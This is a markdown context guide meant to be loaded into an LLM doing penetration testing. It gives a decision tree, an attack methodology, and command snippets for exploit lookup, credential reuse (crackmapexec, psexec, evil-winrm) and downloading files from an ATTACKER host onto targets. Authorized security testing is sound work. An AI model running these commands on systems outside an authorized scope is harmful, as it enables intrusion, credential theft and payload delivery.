# LLM Hacking Context Guide

> This file provides structured context for any LLM (open-source or proprietary) doing penetration testing.
> Load this as initial context to compensate for smaller model reasoning limitations.

## How to Use This Knowledge Base

When given a target, follow this decision tree:

### 1. What type of engagement?
- **Web application** → Load `playbooks/web-app-pentest.md` + `checklists/owasp-top10.md`
- **Network/infrastructure** → Load `playbooks/network-pentest.md` + `checklists/enumeration-checklist.md`
- **Active Directory** → Load `checklists/ad-attack-checklist.md`
- **API testing** → Load `playbooks/api-pentest.md`
- **Cloud infrastructure** → Load `playbooks/cloud-pentest.md`
- **Wireless** → Load `playbooks/wireless-pentest.md`
- **Privilege escalation** → Load `playbooks/privilege-escalation.md`

### 2. What phase are you in?
1. **Recon** → Gather info before touching the target
2. **Enumeration** → Actively probe the target for services/versions
3. **Vulnerability Assessment** → Identify weaknesses
4. **Exploitation** → Gain access
5. **Post-Exploitation** → Escalate, pivot, persist
6. **Reporting** → Document everything

### 3. What tool do you need?
→ Check `knowledge-base/tools/kali-essentials.md` for the right tool and exact command syntax.

### 4. Need a reverse shell?
→ Check `knowledge-base/checklists/reverse-shells.md` for every language and method.

### 5. Need to map to MITRE ATT&CK?
→ Check `knowledge-base/mitre-attack/enterprise-tactics.md` for tactic→technique→tool mapping.

## Attack Methodology (Universal)

```
┌─────────────────────────────────────────────────────────┐
│  1. RECONNAISSANCE                                       │
│     Passive: OSINT, DNS, subdomains, Google dorks       │
│     Active: Port scan, service detection                 │
├─────────────────────────────────────────────────────────┤
│  2. ENUMERATION                                          │
│     Per-port checklist, version detection                │
│     Web: dirs, vhosts, APIs, CMS                        │
│     AD: users, groups, shares, policies                 │
├─────────────────────────────────────────────────────────┤
│  3. VULNERABILITY IDENTIFICATION                         │
│     searchsploit, nuclei, nikto, manual testing         │
│     Map to OWASP Top 10 / MITRE ATT&CK                 │
├─────────────────────────────────────────────────────────┤
│  4. EXPLOITATION                                         │
│     Metasploit, manual exploits, SQLi, RCE              │
│     Get initial foothold (reverse shell / creds)        │
├─────────────────────────────────────────────────────────┤
│  5. POST-EXPLOITATION                                    │
│     Privilege escalation (linpeas/winpeas)              │
│     Credential harvesting (mimikatz/secretsdump)        │
│     Lateral movement (psexec/wmiexec/evil-winrm)       │
│     Persistence (if authorized)                         │
├─────────────────────────────────────────────────────────┤
│  6. REPORTING                                            │
│     Use templates/attack-report-template.md             │
│     Document EVERYTHING with reproducibility            │
└─────────────────────────────────────────────────────────┘
```

## Critical Decision Points

### "I found an open port but don't know what to do"
→ Go to `checklists/enumeration-checklist.md`, find the port, follow every step.

### "I found a service version"
→ Run: `searchsploit SERVICE VERSION`
→ Run: `nuclei -u http://TARGET -t cves/`
→ Check: `msfconsole -q -x "search SERVICE"`

### "I got credentials but can't use them"
→ Try every protocol: SMB, WinRM, RDP, SSH, PSExec, WMIExec
→ `crackmapexec smb TARGET -u USER -p PASS`
→ `crackmapexec winrm TARGET -u USER -p PASS`
→ `evil-winrm -i TARGET -u USER -p PASS`
→ `impacket-psexec DOMAIN/USER:PASS@TARGET`

### "I have a shell but I'm low-privileged"
→ Go to `playbooks/privilege-escalation.md`
→ Run linpeas (Linux) or winpeas (Windows)
→ Check sudo -l, SUID, capabilities, cron, writable files

### "I need to move to another machine"
→ Check `knowledge-base/mitre-attack/enterprise-tactics.md` → Lateral Movement
→ Try credentials on other hosts
→ Set up tunneling if needed (chisel, SSH, ligolo-ng)

### "I need to transfer files to the target"
```bash
# Attacker serves files:
python3 -m http.server 8080

# Target downloads:
# Linux: wget http://ATTACKER:8080/file -O /tmp/file
#        curl http://ATTACKER:8080/file -o /tmp/file
# Windows: certutil -urlcache -f http://ATTACKER:8080/file C:\temp\file
#          powershell (New-Object Net.WebClient).DownloadFile('http://ATTACKER:8080/file','C:\temp\file')
#          powershell iwr -uri http://ATTACKER:8080/file -outfile C:\temp\file

# SMB share:
impacket-smbserver share /path -smb2support
# Windows: copy \\ATTACKER\share\file C:\temp\file
```

## Report Template Location
→ `templates/attack-report-template.md`

## Rules (from Raquel)
→ `AGENTS.md` — Always follow these. Pass to all subagents.
